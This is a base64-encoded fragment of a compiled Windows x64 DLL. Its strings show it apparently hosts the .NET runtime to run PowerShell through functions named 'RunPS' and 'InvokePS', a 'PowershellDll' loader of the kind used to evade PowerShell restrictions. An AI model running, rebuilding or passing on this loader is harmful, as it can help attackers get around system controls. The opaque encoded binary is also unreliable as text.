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B3AGsAcwAAAEMAbwByAEIAaQBuAGQAVABvAFIAdQBuAHQAaQBtAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAAbQBzAGMAbwByAGUAZQAuAGQAbABsAAAAUHJvZ3JhbQBGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAdABoAGUAIAByAHUAbgB0AGkAbQBlACAAaABvAHMAdAAKAAAAAAAAAAAAAAAAAEMATABSACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAAUgB1AG4AdABpAG0AZQBDAGwAcgBIAG8AcwB0ADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AEEAcABwAEQAbwBtAGEAaQBuAEkAZAAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAAAAAABJAEMAbwByAFIAdQBuAHQAaQBtAGUASABvAHMAdAA6ADoARwBlAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAGQAZQBmAGEAdQBsAHQAIABBAHAAcABEAG8AbQBhAGkAbgAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABsAG8AYQBkACAAdABoAGUAIABhAHMAcwBlAG0AYgBsAHkAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAAAAAAAAAAAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAVAB5AHAAZQAgAGkAbgB0AGUAcgBmAGEAYwBlACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAUgB1AG4AUABTAAAAAAAAAFMAYQBmAGUAQQByAHIAYQB5AFAAdQB0AEUAbABlAG0AZQBuAHQAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbA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